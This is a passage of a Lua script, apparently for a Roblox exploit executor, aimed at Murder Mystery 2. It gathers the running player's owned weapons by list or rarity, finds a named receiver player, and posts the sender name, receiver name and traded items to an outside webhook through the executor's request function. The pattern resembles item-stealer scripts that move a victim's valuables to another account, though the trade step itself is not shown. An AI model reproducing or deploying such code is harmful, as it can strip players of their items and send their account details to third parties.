local function getProfileData()
    local tab
    pcall(function()
        tab = require(RS:WaitForChild("Modules"):WaitForChild("ProfileData"))
    end)
    return tab
end

local function getSyncWeapons()
    local ok, Sync = pcall(function()
        return require(RS:WaitForChild("Database"):WaitForChild("Sync"))
    end)
    return (ok and Sync and Sync.Weapons) or nil
end

-- Lay danh sach item can trade
local function getItemsToTrade()
    local items = {}
    local pd = getProfileData()
    if not pd or not pd.Weapons or not pd.Weapons.Owned then return items end
    local Weapons = getSyncWeapons()
    if not Weapons then return items end

    -- Neu config co danh sach cu the
    if #TRADE_ITEMS > 0 then
        for _, itemId in ipairs(TRADE_ITEMS) do
            if pd.Weapons.Owned[itemId] then
                local item = Weapons[itemId]
                if item then
                    table.insert(items, {
                        id       = itemId,
                        name     = item.ItemName or item.Name or itemId,
                        rarity   = item.Rarity or "Unknown",
                        itemType = item.ItemType or "Knife",
                    })
                end
            end
        end
        return items
    end

    -- Neu khong co danh sach -> lay theo rarity
    for itemId, _ in pairs(pd.Weapons.Owned) do
        local item = Weapons[itemId]
        if item and item.Rarity == TRADE_RARITY then
            table.insert(items, {
                id       = itemId,
                name     = item.ItemName or item.Name or itemId,
                rarity   = item.Rarity or "Unknown",
                itemType = item.ItemType or "Knife",
            })
        end
    end
    return items
end

-- Tim player theo username trong server
local function findPlayer(username)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == username or p.Name:lower() == username:lower() then
            return p
        end
    end
    return nil
end

local function formatNumber(num)
    local s = tostring(num)
    local k
    repeat s, k = string.gsub(s, "^(-?%d+)(%d%d%d)", "%1,%2") until k == 0
    return s
end

-- ========================================================================
-- WEBHOOK
-- ========================================================================

local function sendWebhook(items)
    if not WEBHOOK_ENABLED or not WEBHOOK_URL or #WEBHOOK_URL == 0 then return end
    local lines = {}
    for _, item in ipairs(items) do
        table.insert(lines, "**" .. item.name .. "** (" .. item.rarity .. ")")
    end
    local embed = {
        title = "💎 Trade VIP MM2 - Done!",
        description = "**👤 Sender:** " .. Player.Name ..
                      "\n**👤 Receiver:** " .. RECEIVER_NAME ..
                      "\n**⚔️ Items:**\n" .. table.concat(lines, "\n"),
        color = 15158332,
        footer = { text = "Trade VIP MM2" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
    }
    pcall(function()
        local json = HttpService:JSONEncode({ embeds = { embed } })
        local req = getgenv and (getgenv().request or getgenv().http_request)
        if type(req) == "function" then
            req({ Url = WEBHOOK_URL, Method = "POST",
                  Headers = { ["Content-Type"] = "application/json" }, Body = json })
        end
    end)
end

